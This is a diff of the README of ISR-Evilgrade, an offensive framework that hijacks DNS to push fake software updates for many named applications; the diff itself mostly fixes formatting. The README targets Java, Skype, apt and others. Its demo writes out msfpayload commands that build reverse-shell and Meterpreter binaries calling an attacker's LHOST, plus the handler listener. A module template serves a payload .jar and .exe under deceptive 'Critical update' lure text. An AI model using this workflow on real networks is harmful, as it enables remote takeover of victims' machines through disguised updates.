@@ -1,5 +1,5 @@
 <p align="center" >
-  <img src="https://code.google.com/p/isr-evilgrade/logo?cct=1312258454" alt="Infobyte" title="Infobyte">
+  <img src="http://www.infobytesec.com/assets/img/infobyte-logo-web-blanco.png" alt="Infobyte" title="Infobyte">
 </p>
 <p align="center" >
 [ISR] - Infobyte Security Research
@@ -13,7 +13,7 @@ It comes with pre-made binaries (agents), a working default configuration for fa
 Easy to set up new settings, and has an autoconfiguration when new binary agents are set.
 
 * When should I use evilgrade?
- 
+
 This framework comes into play when the attacker is able to make hostname redirections (manipulation of victim's dns traffic), and such thing can be done on 2 scenarios:
 
 Internal scenery:
@@ -28,7 +28,7 @@ External scenery:
 - Internal DNS access
 - DNS Cache Poisoning
 
-* How does it work? 
+* How does it work?
 
 Evilgrade works with modules, in each module there's an implemented structure which is needed to emulate a fake update for an specific application/system.
 
@@ -38,52 +38,52 @@ ISR-Evilgrade is crossplatform, it only depends of having an appropriate payload
 
 Implemented modules:
 -------------------
-- Freerip 3.30                                                                                                                                                                     
-- Jet photo 4.7.2                                                                                                                                                                  
-- Teamviewer 5.1.9385                                                                                                                                                             
-- ISOpen 4.5.0                                                                                                                                                                     
-- Istat.                                                                                                                                                                           
-- Gom 2.1.25.5015                                                                                                                                                                  
-- Atube catcher 1.0.300                                                                                                                                                            
-- Vidbox 7.5                                                                                                                                                                       
-- Ccleaner 2.30.1130                                                                                                                                                               
-- Fcleaner 1.2.9.409                                                                                                                                                               
-- Allmynotes 1.26                                                                                                                                                                  
-- Notepad++ 5.8.2                                                                                                                                                                 
-- Java 1.6.0_22  winxp/win7                                                                                                                                                       
-- aMSN 0.98.3                                                                                                                                                                      
-- Appleupdate <= 2.1.1.116 ( Safari 5.0.2 7533.18.5, <= Itunes 10.0.1.22, <= Quicktime 7.6.8 1675)                                                                                
-- Mirc 7.14                                                                                                                                                                       
-- Windows update (ie6 lastversion, ie7 7.0.5730.13, ie8 8.0.60001.18702, Microsoft works)                                                                                         
-- Dap 9.5.0.3                                                                                                                                                                     
-- Winscp 4.2.9                                                                                                                                                                    
-- AutoIt Script 3.3.6.1                                                                                                                                                            
-- Clamwin 0.96.0.1                                                                                                                                                                 
-- AppTapp Installer 3.11 (Iphone/Itunes)                                                                                                                                           
-- getjar (facebook.com)                                                                                                                                                            
-- Google Analytics Javascript injection                                                                                                                                            
-- Speedbit Optimizer 3.0 / Video Acceleration 2.2.1.8                                                                                                                              
-- Winamp 5.581                                                                                                                                                                    
-- TechTracker (cnet) 1.3.1 (Build 55)                                                                                                                                              
-- Nokiasoftware firmware update 2.4.8es - (Windows software)                                                                                                                       
-- Nokia firmware v20.2.011                                                                                                                                                         
-- BSplayer 2.53.1034                                                                                                                                                               
-- Apt ( < Ubuntu 10.04 LTS)                                                                                                                                                       
-- Ubertwitter 4.6 (0.971)                                                                                                                                                          
-- Blackberry Facebook 1.7.0.22 | Twitter 1.0.0.45                                                                                                                                  
-- Cpan 1.9402                                                                                                                                                                     
-- VirtualBox (3.2.8 )                                                                                                                                                              
-- Express talk                                                                                                                                                                     
-- Filezilla                                                                                                                                                                        
-- Flashget                                                                                                                                                                         
-- Miranda                                                                                                                                                                          
-- Orbit                                                                                                                                                                            
-- Photoscape.                                                                                                                                                                      
-- Panda Antirootkit                                                                                                                                                                
-- Skype                                                                                                                                                                            
-- Sunbelt                                                                                                                                                                          
-- Superantispyware                                                                                                                                                                 
-- Trillian <= 5.0.0.26 
+- Freerip 3.30
+- Jet photo 4.7.2
+- Teamviewer 5.1.9385
+- ISOpen 4.5.0
+- Istat.
+- Gom 2.1.25.5015
+- Atube catcher 1.0.300
+- Vidbox 7.5
+- Ccleaner 2.30.1130
+- Fcleaner 1.2.9.409
+- Allmynotes 1.26
+- Notepad++ 5.8.2
+- Java 1.6.0_22  winxp/win7
+- aMSN 0.98.3
+- Appleupdate <= 2.1.1.116 ( Safari 5.0.2 7533.18.5, <= Itunes 10.0.1.22, <= Quicktime 7.6.8 1675)
+- Mirc 7.14
+- Windows update (ie6 lastversion, ie7 7.0.5730.13, ie8 8.0.60001.18702, Microsoft works)
+- Dap 9.5.0.3
+- Winscp 4.2.9
+- AutoIt Script 3.3.6.1
+- Clamwin 0.96.0.1
+- AppTapp Installer 3.11 (Iphone/Itunes)
+- getjar (facebook.com)
+- Google Analytics Javascript injection
+- Speedbit Optimizer 3.0 / Video Acceleration 2.2.1.8
+- Winamp 5.581
+- TechTracker (cnet) 1.3.1 (Build 55)
+- Nokiasoftware firmware update 2.4.8es - (Windows software)
+- Nokia firmware v20.2.011
+- BSplayer 2.53.1034
+- Apt ( < Ubuntu 10.04 LTS)
+- Ubertwitter 4.6 (0.971)
+- Blackberry Facebook 1.7.0.22 | Twitter 1.0.0.45
+- Cpan 1.9402
+- VirtualBox (3.2.8 )
+- Express talk
+- Filezilla
+- Flashget
+- Miranda
+- Orbit
+- Photoscape.
+- Panda Antirootkit
+- Skype
+- Sunbelt
+- Superantispyware
+- Trillian <= 5.0.0.26
 - Adium 1.3.10 (Sparkle Framework)
 - VMware
 - more...
@@ -94,7 +94,7 @@ Implemented modules:
 ## .:: [MAIN USAGE] ::.
 
 It works similar to an IOS console
-
+```
 evilgrade>help
 Type 'help command' for more detailed help on a command.
   Commands:
@@ -115,7 +115,7 @@ Type 'help command' for more detailed help on a command.
      vhosts   - Show VirtualHosts of current module.
      modules  - List all modules available for use.
      active   - Show active modules.
-
+```
 
 ## List implemented modules
 ``` console
@@ -129,7 +129,7 @@ List of modules:
 ...
 
 - 63 modules available.
-```   
+```
 #### Configure a specified module
 ``` console
 evilgrade>conf sunjava
@@ -217,7 +217,7 @@ Users status:
 
 ## .:: [DEEP USAGE] ::.
 
-### Commands 
+### Commands
 #### configure / conf - Configure <module-name>
 
 Example:
@@ -232,15 +232,15 @@ evilgrade(sunjava)>
 ## 'conf' takes us back to the global configuration
 evilgrade(sunjava)>conf
 evilgrade>
-```
+
 
 ##
 reload    - Reload to get all modules update (to refresh loaded modules, useful on development)
-
-
- 
 start     - Start webserver
 stop      - Stop webserver (fake update server)
+```
+
+
 Example:
 -------
 ``` console
@@ -298,7 +298,7 @@ show modules    - Display implemented modules
 
 #########################################
 
-show options    - Display modules/global options 
+show options    - Display modules/global options
 
 Example:
 -------
@@ -408,7 +408,7 @@ Display options:
 | port        |          80 | Webserver listening port                                |
 | sslport     |         443 | Webserver SSL listening port                            |
 '-------------+-------------+---------------------------------------------------------'
-```
+
 
 ###############################
 
@@ -419,6 +419,8 @@ exit      - exits the program
 help      - prints this screen, or help on 'command'
 
 #######################################
+
+```
 
 .:: [DEMO] ::.
 
@@ -434,8 +436,9 @@ The agent is our fake update binary, we have to set the path to where it's locat
 With this feature we can generate any payload of metasploit or use an external interface to create the binary.
 
 # Example 1:
-
+```
 evilgrade(sunjava)>set agent '["/metasploit/msfpayload windows/shell_reverse_tcp LHOST=192.168.233.2 LPORT=4141 X > <%OUT%>/tmp/a.exe<%OUT%>"]'
+```
 
 In this case for every required update binary we generate a fake update binary with the payload "windows/shell_reverse_tcp"
 using a reverse shell to connect at address 192.168.233.2 port 4141.
@@ -444,7 +447,9 @@ Evilgrade detects the usage of "dynamic fake update binary feature" due to havin
 Inside that brackets we have a string that is also between brackets "" that is compiled using perl.
 
 For example if we use:
+```
 evilgrade(sunjava)>set agent '["./generatebin -o <%OUT%>/tmp/update".int(rand(256)).".exe<%OUT%>"]'
+```
 then every time we get a binary request, evilgrade will compile the line and execute the final string "./generatebin -o /tmp/update(random).exe"
 generating different agents.
 
@@ -454,18 +459,23 @@ An easy alternative, but not dynamically, could be to generate the payload direc
 # Example 2:
 
 (Outside evilgrade)
+```
 [team@infobyte]$ msfpayload windows/meterpreter/reverse_ord_tcp LHOST=192.168.100.2 LPORT=4444 X > /tmp/reverse-shell.exe
+```
 
 (Inside evilgrade)
+```
 evilgrade(sunjava)>set agent /tmp/reverse-shell.exe
+```
 
 After our payload was generated, we leave a multi handler listening on the previously assigned LHOST.
 
 (Outside evilgrade)
+```
 [team@infobyte]$ msfcli exploit/multi/handler PAYLOAD=windows/shell/reverse_tcp LHOST=192.168.100.2 LPORT=4444 E
-[*] Started reverse handler on 192.168.100.2:4444 
+[*] Started reverse handler on 192.168.100.2:4444
 [*] Starting the payload handler...
-
+```
 
 .:: [MODULE DEVELOPMENT] ::.
 
@@ -486,129 +496,133 @@ my $base=
     'author' => [ 'Francisco Amato < famato +[AT]+ infobytesec.com>' ], #author
     'description' => qq{}, #brief description
     'vh' => '(java.sun.com|javadl-esd.sun.com)', #VirtualHosts that the application uses to retrieve information about the update configuration files and update binaries.
-    
+
     #Then we have the request object's collection
     'request' => [
     #Each object it's a possible HTTP request inside the virtualhost configured for the module (java.sun.com)
-  	    {
-		    'req' => '(/update/[.\d]+/map\-[.\d]+.xml|/update/1.6.0/map\-m\-1.6.0.xml)', #The required URL, regex friendly
-		    'type' => 'file', #it's the response type (file|string|agent|install)
-		     #we can use:
+        {
+        'req' => '(/update/[.\d]+/map\-[.\d]+.xml|/update/1.6.0/map\-m\-1.6.0.xml)', #The required URL, regex friendly
+        'type' => 'file', #it's the response type (file|string|agent|install)
+         #we can use:
                       #file: response with content file referenced in the "file" option below (./include/sunjava_map.xml)
                       #string: response with a string referenced in the "string" options below
                       #agent:  response with content file referenced in the "agent" options (options section)
                       #install: response with content file referenced in the "file" option below
-                      	#It's used to know if the fake update was executed
-                      	#In some update process we can specify a final page after update installed
-                      	#so we send to a controller page.
-		    'method' => '', #not implemented yet
-		    'bin'    => '', #set to 1 if we are going to send a binary file
-		    'string' => '', #if we have chosen the 'type' string then in this variable we set the response
-		    'parse' => '', #set to 1 if the file or string need be parsed with options
-		    'file' => './include/sunjava/sunjava_map.xml'
-		    },
+                        #It's used to know if the fake update was executed
+                        #In some update process we can specify a final page after update installed
+                        #so we send to a controller page.
+        'method' => '', #not implemented yet
+        'bin'    => '', #set to 1 if we are going to send a binary file
+        'string' => '', #if we have chosen the 'type' string then in this variable we set the response
+        'parse' => '', #set to 1 if the file or string need be parsed with options
+        'file' => './include/sunjava/sunjava_map.xml'
+        },
 
-		    {
-		    'req' => '^/java_update.xml$', #regex friendly
-		    'type' => 'file', #file|string|agent|install
-		    'method' => '', #any
-		    'bin'    => '',		    
-		    'string' => '',
-		    'parse' => '1',
-		    'file' => './include/sunjava/sunjava_update.xml'
-		    },
-		    {
-		    'req' => '/x.jnlp', #regex friendly
-		    'type' => 'file', #file|string|agent|install
-		    'method' => '', #any
-		    'bin'    => '',		    
-		    'string' => '',
-		    #In this case we parse the file
+        {
+        'req' => '^/java_update.xml$', #regex friendly
+        'type' => 'file', #file|string|agent|install
+        'method' => '', #any
+        'bin'    => '',
+        'string' => '',
+        'parse' => '1',
+        'file' => './include/sunjava/sunjava_update.xml'
+        },
+        {
+        'req' => '/x.jnlp', #regex friendly
+        'type' => 'file', #file|string|agent|install
+        'method' => '', #any
+        'bin'    => '',
+        'string' => '',
+        #In this case we parse the file
                     'parse' => '1',
-		    #To parse the file we use special tags, like <%OPTIONAME%> inside the "file" or "string" field
-	            #This tags are replaced with the values of the options, for example
-	            #<%TITLE%> will be replaced by 'Critical update'
-		    'file' => './include/sunjava/x.jnlp'
-		    },
-		    {
-		    'req' => '.jar', #regex friendly
-		    'type' => 'file', #file|string|agent|install
-		    'method' => '', #any
-		    'bin'    => 1,		    
-		    'string' => '',
-		    'parse' => '',
-		    'file' => './include/sunjava/JavaPayload/FunnyClass2.jar'
-		    },		    
+        #To parse the file we use special tags, like <%OPTIONAME%> inside the "file" or "string" field
+              #This tags are replaced with the values of the options, for example
+              #<%TITLE%> will be replaced by 'Critical update'
+        'file' => './include/sunjava/x.jnlp'
+        },
+        {
+        'req' => '.jar', #regex friendly
+        'type' => 'file', #file|string|agent|install
+        'method' => '', #any
+        'bin'    => 1,
+        'string' => '',
+        'parse' => '',
+        'file' => './include/sunjava/JavaPayload/FunnyClass2.jar'
+        },
 
-		    {
-		    'req' => '.exe', #regex friendly
-		    'type' => 'agent', #Here we have an agent type with a binary response
-		    'bin'    => 1,
-		    'method' => '', #any
-		    'string' => '',
-		    'parse' => '',
-		    'file' => ''
-		    }
+        {
+        'req' => '.exe', #regex friendly
+        'type' => 'agent', #Here we have an agent type with a binary response
+        'bin'    => 1,
+        'method' => '', #any
+        'string' => '',
+        'parse' => '',
+        'file' => ''
+        }
     ],
-    
+
     #Options
     #Here we have the options that will be displayed with "show options" inside the current module.
     #This options are used to parse the string or a file using in the responses
     'options' => {  'agent'  => { 'val' => './agent/java/javaws.exe', #The default value
-		    		  'desc' => 'Agent to inject'}, #Brief description
-		    'arg'    => { 'val' => 'http://java.sun.com/x.jnlp"', 
-			    	  'desc' => 'Arg passed to Agent'},
-		    'enable' => { 'val' => 1, 
-			    	  'desc' => 'Status'},
-			    	  
-		#The following is a dynamic hidden option,
-		#In this case we use the tag <%NAME%> to parse the files and execute perl functions to get randoms values
-		#You can use whatever you like in perl, if you're wishing to use more functions check "isrcore/utils.pm"
+              'desc' => 'Agent to inject'}, #Brief description
+        'arg'    => { 'val' => 'http://java.sun.com/x.jnlp"',
+              'desc' => 'Arg passed to Agent'},
+        'enable' => { 'val' => 1,
+              'desc' => 'Status'},
+
+    #The following is a dynamic hidden option,
+    #In this case we use the tag <%NAME%> to parse the files and execute perl functions to get randoms values
+    #You can use whatever you like in perl, if you're wishing to use more functions check "isrcore/utils.pm"
                     'name'  => { 'val' => "'javaupdate'.isrcore::utils::RndAlpha(isrcore::utils::RndNum(1))",
                                 'hidden' => 1,
-                        	'dynamic' =>1,},                                
-                        	
-		#All the options depend on the update process. You have to research the possible variables and implement them on your module
-		#These are the mostly common update messages, webpages, descriptions, popup messages, title, etc                    
-		    'title'  => { 'val' => 'Critical update',
-			    	  'desc' => 'Title name displayed in the update'},
-		    'description' => { 'val' => 'This critical update fix internal vulnerability',
-					'desc' => 'Description to be displayed during the update'},
-		    'atitle'  => { 'val' => 'Critical vulnerability',
-			    	   'desc' => 'Title name to be displayed in the systray item popup'},
-		    'adescription' => { 'val' => 'This critical update fix internal vulnerability',
-					'desc' => 'Description  to be displayed in the systray item popup'},
-		    'website' => { 'val' => 'http://java.com/moreinfolink',
-			    	   'desc' => 'Website displayed in the update'}
-		 }
+                          'dynamic' =>1,},
+
+    #All the options depend on the update process. You have to research the possible variables and implement them on your module
+    #These are the mostly common update messages, webpages, descriptions, popup messages, title, etc
+        'title'  => { 'val' => 'Critical update',
+              'desc' => 'Title name displayed in the update'},
+        'description' => { 'val' => 'This critical update fix internal vulnerability',
+          'desc' => 'Description to be displayed during the update'},
+        'atitle'  => { 'val' => 'Critical vulnerability',
+               'desc' => 'Title name to be displayed in the systray item popup'},
+        'adescription' => { 'val' => 'This critical update fix internal vulnerability',
+          'desc' => 'Description  to be displayed in the systray item popup'},
+        'website' => { 'val' => 'http://java.com/moreinfolink',
+               'desc' => 'Website displayed in the update'}
+     }
 };
 ```
 
 .:: [TIPS] ::.
 
-1) Don't forget to run evilgrade with an user that has privileges to create listening sockets, 
+1) Don't forget to run evilgrade with an user that has privileges to create listening sockets,
 otherwise you won't be able to use evilgrade's Services.
 2) Everytime you modify a module with evilgrade running don't forget to 'reload' them.
 3) Set the binary 'agents' before starting services because there are some fields that evilgrade
 will fill out for you (agentmd5, agentsha256, and agentsize) that can't be done with them already running.
-                   
+
 .:: [REQUIREMENTS] ::.
 
-# Perl Modules 
+# Perl Modules
+```
     Data::Dump
-    Digest::MD5   
+    Digest::MD5
     Time::HiRes
     RPC::XML
+```
 
 .:: [MORE INFORMATION] ::.
 
 This framework was presented in the following security conferences:
 
+```
 · ekoparty 2007 [Buenos Aires, Argentina] [www.ekoparty.org]
 · Troopers 2008 [Munich, Germany] [www.troopers08.org]
 · Shakacon 2008 [Hawaii, USA] [www.shakacon.org]
 · H2HC 2009 [Brazil] [www.h2hc.com.br]
 · Blackhat Arsenal & Defcon 2010 [Las Vegas, USA] [www.blackhat.com www.defcon.org]
+```
 
 .:: [DOWNLOAD] ::.
 
@@ -618,5 +632,3 @@ http://www.infobytesec.com/developments.html
 
 Francisco Amato
 famato+at+infobytesec+dot+com
- 
-1
